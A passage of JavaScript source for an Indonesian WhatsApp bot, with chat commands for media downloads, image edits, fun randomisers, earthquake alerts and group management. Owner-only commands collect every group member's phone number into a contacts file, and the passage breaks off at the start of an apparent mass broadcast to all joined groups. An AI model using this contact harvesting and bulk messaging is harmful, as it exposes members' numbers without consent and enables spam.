    if (!video) throw 'Video tidak ditemukan'

    await luna.sendMessage(
      m.chat,
      { video: { url: video }, caption: '> Powered by YP AI' },
      { quoted: m }
    )

    setTimeout(() => {
      luna.sendMessage(m.chat, { react: { text: '', key: reactKey } })
    }, 2000)
  } catch (e) {
    if (reactKey) {
      setTimeout(() => {
        luna.sendMessage(m.chat, { react: { text: '', key: reactKey } })
      }, 2000)
    }
    await luna.sendMessage(
      m.chat,
      { text: typeof e === 'string' ? e : 'Terjadi kesalahan' },
      { quoted: m }
    )
  }
}
break 

case 'pilot': {
    try {
        if (!text) {
            return m.reply(`*Contoh*\n${prefix + command} keadilan`);
        }

        await luna.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        const params = new URLSearchParams({
            originalQuery: text,
            transformedQuery: text,
            filter: JSON.stringify({
                publishedYearMin: 2000,
                publishedYearMax: 2024,
                citationMin: 0,
                journalFilter: 'ALL'
            }),
            threadId: '4066ca5f-b0dd-46d9-9241-d39986f618c0',
            numPapers: 15,
            existingCorpusIds: JSON.stringify([]),
            forceUseEpsilonDb: false
        });

        const res = await fetch(
            `https://www.epsilon-ai.com/api/semantic-scholar/question-retrieval?${params.toString()}`,
            {
                headers: {
                    Accept: 'application/json, text/plain, */*',
                    'User-Agent': 'Mozilla/5.0'
                }
            }
        );

        if (!res.ok) {
            throw new Error('Gagal mengambil data dari Epsilon AI');
        }

        const data = await res.json();

        if (!data.papers || !data.papers.length) {
            return m.reply('🍂 *Tidak ditemukan insight yang relevan.*');
        }

        const papers = data.papers.slice(0, 5);

        let output = `🧠 *Epsilon AI – Quick Insight*\n\n`;
        output += `🔎 *Topik:* ${text}\n`;
        output += `📄 *Total Paper:* ${data.papers.length}\n`;
        output += `⚡ *Ditampilkan:* Insight cepat (Top 5)\n\n`;

        for (let i = 0; i < papers.length; i++) {
            const p = papers[i];
            const insight = p.abstract
                ? p.abstract.split('. ').slice(0, 2).join('. ') + '.'
                : 'Insight ringkas tidak tersedia.';

            output += `📌 *${i + 1}. ${p.title || 'Tanpa Judul'}*\n`;
            output += `📅 *Year:* ${p.year || '-'}\n`;
            output += `💡 *Insight:* ${insight}\n`;
            output += `🔗 ${p.url || '-'}\n\n`;
        }

        await m.reply(output.trim());
    } catch (e) {
        await m.reply(`🍂 *Terjadi kesalahan*\n\n${e.message}`);
    } finally {
        await luna.sendMessage(m.chat, { react: { text: '', key: m.key } });
    }
};
break

case 'opentime': {
    if (!isOwner && !isPremium) return reply(mess.owner)
    if (!args[0] || isNaN(args[0])) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    
    const timeUnits = {
        'detik': 1000,
        'menit': 60000,
        'jam': 3600000,
        'hari': 86400000
    }
    const unit = args[1]?.toLowerCase()
    if (!timeUnits[unit]) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    const timer = parseInt(args[0]) * timeUnits[unit]
    m.reply(`Open time ${args[0]} ${unit} dimulai dari sekarang`)
    setTimeout(() => {
        try {
            luna.groupSettingUpdate(m.chat, 'not_announcement')
            m.reply('*Tepat waktu* grup dibuka oleh admin\nsekarang member dapat mengirim pesan')
        } catch (err) {
            m.reply('Terjadi kesalahan saat membuka grup')
            console.log(err)
        }
    }, timer)
}
    break

case 'closetime': {
    if (!isOwner && !isPremium) return reply(mess.owner)
    if (!args[0] || isNaN(args[0])) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    
    const timeUnits = {
        'detik': 1000,
        'menit': 60000,
        'jam': 3600000,
        'hari': 86400000
    }
    const unit = args[1]?.toLowerCase()
    if (!timeUnits[unit]) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    const timer = parseInt(args[0]) * timeUnits[unit]
    m.reply(`Close time ${args[0]} ${unit} dimulai dari sekarang`)
    setTimeout(() => {
        try {
            luna.groupSettingUpdate(m.chat, 'announcement')
            m.reply('*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan')
        } catch (err) {
            m.reply('Terjadi kesalahan saat menutup grup')
            console.log(err)
        }
    }, timer)
}
    break

case "pilot2": {
    try {
        if (!text) {
            return m.reply(`*Contoh*\n${prefix + command} keadilan`);
        }

        await luna.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        const params = new URLSearchParams({
            originalQuery: text,
            transformedQuery: text,
            filter: JSON.stringify({
                publishedYearMin: 2000,
                publishedYearMax: 2024,
                citationMin: 0,
                journalFilter: 'ALL'
            }),
            threadId: '4066ca5f-b0dd-46d9-9241-d39986f618c0',
            numPapers: 15,
            existingCorpusIds: JSON.stringify([]),
            forceUseEpsilonDb: false
        });

        const res = await fetch(
            `https://www.epsilon-ai.com/api/semantic-scholar/question-retrieval?${params.toString()}`,
            {
                headers: {
                    Accept: 'application/json, text/plain, */*',
                    'User-Agent': 'Mozilla/5.0'
                }
            }
        );

        if (!res.ok) {
            throw new Error('Gagal mengambil data dari Epsilon AI');
        }

        const data = await res.json();

        if (!data.papers || !data.papers.length) {
            return m.reply('🍂 *Tidak ditemukan insight yang relevan.*');
        }

        const papers = data.papers.slice(0, 5);

        let output = `🧠 *Epsilon AI – Quick Insight*\n\n`;
        output += `🔎 *Topik:* ${text}\n`;
        output += `📄 *Total Paper:* ${data.papers.length}\n`;
        output += `⚡ *Ditampilkan:* Insight cepat (Top 5)\n\n`;

        for (let i = 0; i < papers.length; i++) {
            const p = papers[i];
            const insight = p.abstract
                ? p.abstract.split('. ').slice(0, 2).join('. ') + '.'
                : 'Insight ringkas tidak tersedia.';

            output += `📌 *${i + 1}. ${p.title || 'Tanpa Judul'}*\n`;
            output += `📅 *Year:* ${p.year || '-'}\n`;
            output += `💡 *Insight:* ${insight}\n`;
            output += `🔗 ${p.url || '-'}\n\n`;
        }

        await m.reply(output.trim());
    } catch (e) {
        await m.reply(`🍂 *Terjadi kesalahan*\n\n${e.message}`);
    } finally {
        await luna.sendMessage(m.chat, { react: { text: '', key: m.key } });
    }
};
break

case "playsf": {
try {

if (!text) {
return reply(`Contoh penggunaan:\n${prefix + command} sesi potret`);
}

Reply("⏳ Sedang mencari lagu di Spotify...");

const axios = require("axios");

const api = `https://api.nexray.eu.cc/downloader/spotifyplay?q=${encodeURIComponent(text)}`;

const { data } = await axios.get(api);

if (!data.status || !data.result) {
return reply("❌ Lagu tidak ditemukan.");
}

let res = data.result;

let caption = `*🎵 SPOTIFY PLAY*

*📀 Judul :* ${res.title}
*🎤 Artist :* ${res.artist}
*💽 Album :* ${res.album}
*⏱ Durasi :* ${res.duration}
*⭐ Popularity :* ${res.popularity}
*📅 Release :* ${res.release_at}

*🔗 Spotify :*
${res.url}

⏳ Mengirim audio...`;

await luna.sendMessage(
m.chat,
{
image: { url: res.thumbnail },
caption
},
{ quoted: m }
);

await luna.sendMessage(
m.chat,
{
audio: { url: res.download_url },
mimetype: "audio/mpeg",
fileName: `${res.title}.mp3`,
ptt: false
},
{ quoted: m }
);

} catch (e) {
console.log(e);
Reply("❌ Terjadi kesalahan saat mengambil lagu Spotify.");
}
}
break;

async function getNpmPackageInfo(packageName) {
    try {
        const { data } = await axios.get(`https://registry.npmjs.com/${encodeURIComponent(packageName)}`, {
            timeout: 15000
        });
        
        if (!data || !data.versions) {
            throw new Error('Package tidak ditemukan');
        }
        
        const latestVersion = data['dist-tags']?.latest || Object.keys(data.versions).pop();
        const versionData = data.versions[latestVersion];
        
        return {
            name: data.name,
            description: data.description || 'Tidak ada deskripsi',
            version: latestVersion,
            license: versionData.license || 'Tidak ada info lisensi',
            author: data.author?.name || versionData.author?.name || 'Unknown',
            homepage: data.homepage || `https://www.npmjs.com/package/${data.name}`,
            repository: data.repository?.url || 'Tidak ada info repository',
            downloads: data.downloads || 'N/A',
            tarballUrl: versionData.dist.tarball,
            size: versionData.dist.unpackedSize || versionData.dist.size || 0,
            dependencies: versionData.dependencies || {},
            devDependencies: versionData.devDependencies || {}
        };
    } catch (error) {
        if (error.response?.status === 404) {
            throw new Error('Package tidak ditemukan di NPM Registry');
        }
        throw new Error(error.message);
    }
}


async function downloadNpmPackage(tarballUrl, filename) {
    try {
        const { data } = await axios({
            method: 'GET',
            url: tarballUrl,
            responseType: 'arraybuffer',
            timeout: 30000
        });
        
        return Buffer.from(data);
    } catch (error) {
        throw new Error('Gagal mendownload package: ' + error.message);
    }
}

function extractId(url) {
    try {
        const parts = new URL(url).pathname.split('/').filter(Boolean);
        const id = parts.pop();
        return id || null;
    } catch (e) {
        return null;
    }
};

case "skipcode": {
    try {
        let [link, type] = text.split(" ");
        if (!link.includes("github")) return m.reply(`⚠️ Masukan Link Gits Code!
 \`--doc\` kirim pesan code pake document`);

        const id = extractId(link)
        const getRaw = await (await axios.get(`https://api.github.com/gists/${id}`)).data;
        const files = Object.values(getRaw?.files || []);

        for (let i = 0; files.length > 0 && i < files.length; i++) {
            const file = files[i]

            if (type?.endsWith("--doc")) {
                const buffer = Buffer.from(file.content, "utf-8")

                await luna.sendMessage(m.chat, {
                    document: buffer,
                    fileName: file.filename,
                    mimetype: file.type
                }, {
                    quoted: m
                })
            } else {
                await m.reply(file.content)
            };
        };

    } catch (e) {
        m.reply("❌ Gomene Error Mungkin lu kebanyakan request");
        console.error(e);
    };
};
break

const sleep = ms => new Promise(r => setTimeout(r, ms));

case "hd":
case "enhance": {
try {

if (!/image/.test(mime)) {
return m.reply(
`⚠️ *Format Penggunaan :*

💬 Contoh :
Reply/Kirim gambar dengan caption
${prefix + command}`
);
}

await luna.sendMessage(m.chat, {
react: { text: "🖼️", key: m.key }
});

const quoted = m.quoted ? m.quoted : m;

const buffer = await quoted.download();

const FormData = require("form-data");
const axios = require("axios");

const form = new FormData();

form.append("method", "1");
form.append("is_pro_version", "false");
form.append("is_enhancing_more", "false");
form.append("max_image_size", "high");

form.append("file", buffer, {
filename: "image.jpg",
contentType: "image/jpeg"
});

const response = await axios.post(
"https://ihancer.com/api/enhance",
form,
{
headers: form.getHeaders(),
responseType: "arraybuffer"
}
);

const result = Buffer.from(response.data);

await luna.sendMessage(
m.chat,
{
image: result,
caption:
`*HD Image Success* ✅

🖼️ Gambar berhasil di enhance menjadi HD
> *Powered By Luna-MD*`
},
{ quoted: m }
);

await luna.sendMessage(m.chat, {
react: { text: "✅", key: m.key }
});

} catch (err) {

console.error("HD Error:", err?.response?.data || err.message);

await luna.sendMessage(
m.chat,
{
text:
`⚠️ Maaf , terjadi kesalahan saat meng-HD-kan gambar.

💡 Detail Error :
${err?.response?.data?.message || err.message}`
},
{ quoted: m }
);

await luna.sendMessage(m.chat, {
react: { text: "❌", key: m.key }
});

}
}
break

case "babu": {
if (!isOwner) return reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah User kacung jadi Prem  ✅`)
}
break

case 'totalchat':
case 'statgroup': {
  if (!m.isGroup) return m.reply('Fitur ini hanya bisa digunakan di grup.');
  const stats = getTodayStats(m.chat)
  if (Object.keys(stats).length === 0) return m.reply('Belum ada data chat hari ini.')
  let teks = `*Statistik Chat Hari Ini:*\n\n`
  const sorted = Object.entries(stats).sort((a, b) => b[1] - a[1])
  let i = 1
  for (const [user, total] of sorted) {
    const name = luna.getName ? await luna.getName(user) : user.split('@')[0]
    teks += `${i++}. ${name} - ${total} chat\n`
  }
  m.reply(teks)
}
break

case 'cekbio3': {
    if (!q) return reply(`*Syntax Error*\nExample:\n${command} 628xxxx`);

    let nomor = q.replace(/[^0-9]/g, '');
    const jid = nomor + '@s.whatsapp.net';

    try {
        const result = await luna.fetchStatus(jid);

        if (!result || !result.status) {
            return luna.sendMessage(m.chat, { text: `❌ Bio tidak ditemukan / User tidak memiliki bio` }, { quoted: m });
        }

        const waktu = result.setAt
            ? new Date(result.setAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
            : '-';

        const teks = `
*Cek Bio Ny Luna-MD*
- Nomor: +${nomor}
- Bio: ${result.status}
- Update Bio: ${waktu}

© Copyright By Luna-MD`;

        await luna.sendMessage(m.chat, { text: teks }, { quoted: qloc });

    } catch (e) {
        await luna.sendMessage(m.chat, { text: `❌ Gagal mengambil bio.\nError: ${e}` }, { quoted: qloc });
    }
}
break;

case 'sf':
case 'sfile': {
  try {
    const axios = require("axios");
    const mime = require("mime-types");   
    const cheerio = require("cheerio");    

const sfile = {
  createHeaders: referer => ({
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="137", "Google Chrome";v="137"',
    'dnt': '1',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'Referer': referer,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9'
  }),

  extractCookies: h => h['set-cookie']?.map(c => c.split(';')[0]).join('; ') || '',

  extractMetadata: $ => {
    const m = {}
    $('.file-content').eq(0).each((_, e) => {
      const x = $(e)
      m.file_name = x.find('img').attr('alt')
      m.mimetype = x.find('.list').eq(0).text().trim().split('-')[1].trim()
      m.upload_date = x.find('.list').eq(2).text().trim().split(':')[1].trim()
      m.download_count = x.find('.list').eq(3).text().trim().split(':')[1].trim()
      m.author_name = x.find('.list').eq(1).find('a').text().trim()
    })
    return m
  },

  makeRequest: async (u, o) => {
    try { return await axios.get(u, o) }
    catch (e) { if (e.response) return e.response; throw new Error(`Request gagal: ${e.message}`) }
  },

  download: async (url, resultBuffer = false) => {
    try {
      let h = sfile.createHeaders(url)
      const init = await sfile.makeRequest(url, { headers: h })
      const ck = sfile.extractCookies(init.headers)
      h.Cookie = ck
      let $ = cheerio.load(init.data)
      const meta = sfile.extractMetadata($)
      const dl = $('#download').attr('href')
      if (!dl) throw new Error('Download URL gak ketemu')
      h.Referer = dl
      const proc = await sfile.makeRequest(dl, { headers: h })
      const html = proc.data
      $ = cheerio.load(html)
      const scr = $('script').map((i, el) => $(el).html()).get().join('\n')
      const re = /https:\\\/\\\/download\d+\.sfile\.mobi\\\/downloadfile\\\/\d+\\\/\d+\\\/[a-z0-9]+\\\/[^\s'"]+\.[a-z0-9]+(\?[^"']+)?/gi
      const mt = scr.match(re)
      if (!mt?.length) throw new Error('Link download final gak ketemu di script')
      const fin = mt[0].replace(/\\\//g, '/')
      let download
      if (resultBuffer) {
        const file = await sfile.makeRequest(fin, { headers: h, responseType: 'arraybuffer' })
        download = Buffer.from(file.data)
      } else download = fin
      return { metadata: meta, download }
    } catch (e) { throw new Error(`${e.message}`) }
  }
}
    if (!args[0]) return m.reply('*Example :* .sfile https://sfile.mobi/2E5O1HMVKcc')
    let data = await sfile.download(args[0], true)
    let { file_name, mimetype, upload_date, download_count, author_name } = data.metadata
    let type = mime.lookup(file_name) || 'application/octet-stream'
    await luna.sendMessage(m.chat, { document: data.download, fileName: file_name, mimetype: type }, { quoted: m })
  } catch (e) { m.reply(e.message) }
}
break

case "delete":
case "del": {
    
    if (!isOwner) return reply(mess.owner)
    if (!m.quoted) return m.reply("reply pesannya")

    await luna.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: Boolean(m.quoted.fromMe),
            id: m.quoted.id,
            participant: m.quoted.sender
        }
    })
}
break

case 'readmore': {
  if (!text.includes('|')) return m.reply('Gunakan tanda "|" untuk memisahkan bagian teks dengan efek readmore.\nContoh: .readmore aku | suka | kamu ❤️')
  const more = String.fromCharCode(8206).repeat(4001)
  const teks = text.split('|').join(more)
  m.reply(teks)
}
  break

case "upswgc":
            case "swgrup": {
                if (!isOwner) return reply(mess.owner)
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.upswgc\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await luna.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                        await luna.sendMessage(m.chat, {
    react: { text: "✅", key: m.key }
});
 
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await luna.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                        await luna.sendMessage(from, {
        react: {
            text: "✅",
            key: m.key
        }
    });

                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await luna.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                        await luna.sendMessage(from, {
        react: {
            text: "✅",
            key: m.key
        }
    });

                } else if (caption) {
                    await luna.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                        await luna.sendMessage(from, {
        react: {
            text: "✅",
            key: m.key
        }
    });

                } else {
                    await m.reply(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
                }
            }
            break;

case 'waifu': {
  try {
    await luna.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    
    const apiUrl = 'https://api.nekolabs.my.id/random/blue-archive'
    const res = await fetch(apiUrl)
    if (!res.ok) throw new Error(`Status ${res.status}`)

    const buffer = await res.arrayBuffer()
    await luna.sendMessage(
      m.chat, 
      { 
        image: Buffer.from(buffer), 
        caption: '🍁 *Nih Blue Archive nya~*' 
      }, 
      { quoted: m }
    )
  } catch (e) {
    console.error(e)
    await m.reply(`🍂 *Ups error:* ${e.message || e}`)
  } finally {
    await luna.sendMessage(m.chat, { react: { text: '', key: m.key } })
  }
}
break

case "ig":
case "instagram": {
try {
if (!text) return m.reply(`Contoh:\n${prefix + command} https://www.instagram.com/reel/DaH1GCUvqVn/?igsh=xxxxx`)

if (!text.includes("instagram.com"))
return m.reply("❌ Link Instagram tidak valid!")

await m.reply("⏳ Sedang mengambil media Instagram...")

const axios = require("axios")

const api = `https://api.azbry.com/api/download/instagram?url=${encodeURIComponent(text)}`
const { data } = await axios.get(api)

if (!data.status) {
return m.reply("❌ Gagal mengambil media Instagram.")
}

let caption = `乂 *INSTAGRAM DOWNLOADER*

📦 *Type:* ${data.type || "-"}
🎬 *Total Video:* ${data.videos?.length || 0}
🖼️ *Total Foto:* ${data.images?.length || 0}

> Powered By Azbry API`


if (data.thumb) {
await luna.sendMessage(m.chat, {
image: { url: data.thumb },
caption
}, { quoted: m })
}


if (data.videos && data.videos.length > 0) {
for (let video of data.videos) {
await luna.sendMessage(m.chat, {
video: { url: video },
caption: "✅ Video Instagram berhasil diunduh."
}, { quoted: m })
}
}


if (data.images && data.images.length > 0) {
for (let img of data.images) {
await luna.sendMessage(m.chat, {
image: { url: img },
caption: "✅ Foto Instagram berhasil diunduh."
}, { quoted: m })
}
}

if ((!data.videos || data.videos.length === 0) &&
(!data.images || data.images.length === 0)) {
return m.reply("❌ Media tidak ditemukan.")
}

} catch (e) {
console.log(e)
m.reply(`❌ Error\n${e.message}`)
}
}
break

case 'quoteimg': {
  if (!q) return m.reply("Kirim teks quotes-nya dulu ya.\nContoh: .quoteimg jangan nyerah ya, kamu hebat kok")

  try {
    const { createCanvas, loadImage } = require('canvas')
    const axios = require('axios')

    const width = 1000
    const height = 500
    const canvas = createCanvas(width, height)
    const ctx = canvas.getContext('2d')
    ctx.fillStyle = '#ffffff'
    ctx.fillRect(0, 0, width, height)

    const avatarUrl = await luna.profilePictureUrl(m.sender, 'image')
    const avatarBuffer = (await axios.get(avatarUrl, { responseType: 'arraybuffer' })).data
    const avatarImg = await loadImage(avatarBuffer)

    ctx.drawImage(avatarImg, 60, 130, 240, 240)

    ctx.fillStyle = '#000000'
    ctx.font = '40px sans-serif'

    function wrapText(text, maxWidth) {
      const words = text.split(' ')
      let lines = []
      let line = ''

      for (const word of words) {
        const testLine = line + word + ' '
        const metrics = ctx.measureText(testLine)
        if (metrics.width > maxWidth && line) {
          lines.push(line.trim())
          line = word + ' '
        } else {
          line = testLine
        }
      }
      if (line) lines.push(line.trim())
      return lines
    }

    const maxTextWidth = 600
    const lines = wrapText(q, maxTextWidth)

    let y = 180
    for (const line of lines) {
      ctx.fillText(line, 350, y)
      y += 55
    }

    ctx.fillStyle = '#505050'
    ctx.font = '30px sans-serif'
    ctx.fillText(`- ${m.pushName || m.sender.split('@')[0]}`, 350, y + 20)

    const buffer = canvas.toBuffer('image/png')

    await luna.sendMessage(m.chat, {
      image: buffer,
      caption: 'Berikut quotes-nya~'
    }, { quoted: m })

  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat mengambil foto profil atau membuat gambar.')
  }
}
break

case 'cekgila': {
  const nama = text||m.pushName||'Kamu'
  const persen = Math.floor(Math.random() * 101)

  const komentar = [
    'Normal... kayak batu bata.',
    'Agak nyeleneh, tapi masih bisa diajak diskusi.',
    'Udah mulai ngaco, tolong dijaga.',
    'Wah ini sih gila bener, cocok masuk rumah tertawa.',
    'Level dewa... gila tapi keren.',
    'Gila banget, sampe bot aja pusing baca chat kamu.',
    'Kayaknya udah enggak bisa diselamatkan 😭',
    'Kamu waras, tapi cuma kalau tidur.',
    'Gila dalam diam... serem banget kamu.',
    'Gila bergaya profesional. Respect.'
  ]

  const kata = komentar[Math.floor(Math.random() * komentar.length)]

  m.reply(`🧠 *Tes Kegilaan Hari Ini*\n\n?? Nama: *${nama}*\n📊 Tingkat Gila: *${persen}%*\n🗯️ Komentar: *${kata}*`)
}
break

case 'jodoh': {
  if (!text.includes('|')) return m.reply('Contoh: .jodoh John|Jane');
  const [nama1, nama2] = text.split('|');
  const persen = Math.floor(Math.random() * 100) + 1;
  m.reply(`❤️ Kecocokan antara *${nama1.trim()}* dan *${nama2.trim()}* adalah *${persen}%*`);
  break;
}

case 'serfikat': {
  if (!text) return m.reply(`Kirim perintah *${command} [teks]*\n\nContoh: *${command} Hilman*`)

  try {
    let url = `https://api.sxtream.xyz/maker/yapping?name=${encodeURIComponent(text)}`
    let res = await fetch(url)

    if (!res.ok) throw '❌ Gagal mengambil data dari API.'

    let buffer = await res.buffer()
    await luna.sendFile(m.chat, buffer, 'srtdarksistem.jpg', `🗣️ Sertifikat Dark Sistem by *${text}*`, m)

  } catch (e) {
    console.error(e)
    m.reply('❌ Terjadi kesalahan saat mengambil gambar.')
  }
}
break

case "motivasi": {
  try {
    let res = await fetch('https://veloria-ui.vercel.app/random/motivasi');
    let data = await res.json();

    if (!data || !data.quotes) return m.reply("❌ Gagal mengambil quote.");

    let quote = `📜 *Motivasi Hari Ini*\n\n"${data.quotes}"\n\n📝 _Luna-MD_`;

    luna.sendMessage(m.chat, {
      text: quote
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    m.reply("❌ Terjadi kesalahan saat mengambil data.");
  }
}
  break

case 'fakestory': {
 try {
 const { createCanvas, loadImage } = require('canvas')
 await luna.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
 let [username, caption] = text.split('|')
 if (!username || !caption) return m.reply(`Kek gini:\n.${command} Ichika|hmm...`)
 const bgUrl = 'https://files.catbox.moe/3gwr1l.jpg'
 const bg = await loadImage(bgUrl)
 const userPP = await luna.profilePictureUrl(m.sender, 'image').catch(_ => 'https://img1.pixhost.to/images/5831/600387261_biyu-offc.jpg')
 const pp = await loadImage(userPP)
 const canvas = createCanvas(720, 1280)
 const ctx = canvas.getContext('2d')
 ctx.drawImage(bg, 0, 0, canvas.width, canvas.height)
 const ppX = 40
 const ppY = 250
 const ppSize = 70
 ctx.save()
 ctx.beginPath()
 ctx.arc(ppX + ppSize / 2, ppY + ppSize / 2, ppSize / 2, 0, Math.PI * 2)
 ctx.closePath()
 ctx.clip()
 ctx.drawImage(pp, ppX, ppY, ppSize, ppSize)
 ctx.restore()
 ctx.font = '28px Arial'
 ctx.fillStyle = '#FFFFFF'
 ctx.textAlign = 'left'
 ctx.textBaseline = 'middle'
 const usernameX = ppX + ppSize + 15
 const usernameY = ppY + ppSize / 2
 ctx.fillText(username, usernameX, usernameY)
 ctx.font = 'bold 30px Arial'
 ctx.fillStyle = '#FFFFFF'
 ctx.textAlign = 'center'
 ctx.textBaseline = 'top'
 const captionX = canvas.width / 2
 const captionY = canvas.height - 650
 const maxWidth = canvas.width - 100
 const lineHeight = 42
 wrapTextCenter(ctx, caption, captionX, captionY, maxWidth, lineHeight)
 let buffer = canvas.toBuffer()
 await luna.sendMessage(m.chat, {
 image: buffer,
 caption: 'Berhasil'
 }, { quoted: m })
 } catch (e) {
 m.reply(`❌ Error\nLogs error : ${e.message}`)
 }
 function wrapTextCenter(ctx, text, x, y, maxWidth, lineHeight) {
 let line = ''
 for (let i = 0; i < text.length; i++) {
 let testLine = line + text[i]
 let testWidth = ctx.measureText(testLine).width
 if (testWidth > maxWidth && line !== '') {
 ctx.fillText(line, x, y)
 line = text[i]
 y += lineHeight
 } else {
 line = testLine
 }
 }
 if (line) ctx.fillText(line, x, y)
 }
}
break

case "cekgempa": {
    m.reply("Memproses pencarian");
    
    try {
        const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
        const data = await response.json();
        
        if (!data || !data.Infogempa || !data.Infogempa.gempa) {
            return m.reply("Gagal mendapatkan data gempa dari BMKG.");
        }
        
        const gempa = data.Infogempa.gempa;
        
        let caption = `*📈 INFO GEMPA TERKINI*\n\n`;
        caption += `*Tanggal:* ${gempa.Tanggal}\n`;
        caption += `*Waktu:* ${gempa.Jam}\n`;
        caption += `*Magnitudo:* ${gempa.Magnitude}\n`;
        caption += `*Kedalaman:* ${gempa.Kedalaman}\n`;
        caption += `*Lokasi:* ${gempa.Wilayah}\n`;
        caption += `*Koordinat:* ${gempa.Lintang} ${gempa.Bujur}\n`;
        caption += `*Potensi:* ${gempa.Potensi}\n`;
        caption += `*Dirasakan:* ${gempa.Dirasakan}\n\n`;
        caption += `Sumber: BMKG (https://www.bmkg.go.id/)`;
        
        if (gempa.Shakemap) {
            const shakemapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
            await luna.sendMessage(m.chat, {
                image: { url: shakemapUrl },
                caption: caption
            }, { quoted: m });
        } else {
            luna.sendMessage(m.chat, { text: caption }, { quoted: m });
        }
    } catch (error) {
        console.log(error);
        m.reply("Terjadi kesalahan saat mengambil data gempa.");
    }
}
break

case "savekontak2": {
if (!isOwner) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await luna.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

case "savekontak": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await luna.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await luna.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

case "jpm3": {
if (!isOwner) return reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await luna.groupFetchAllParticipating()
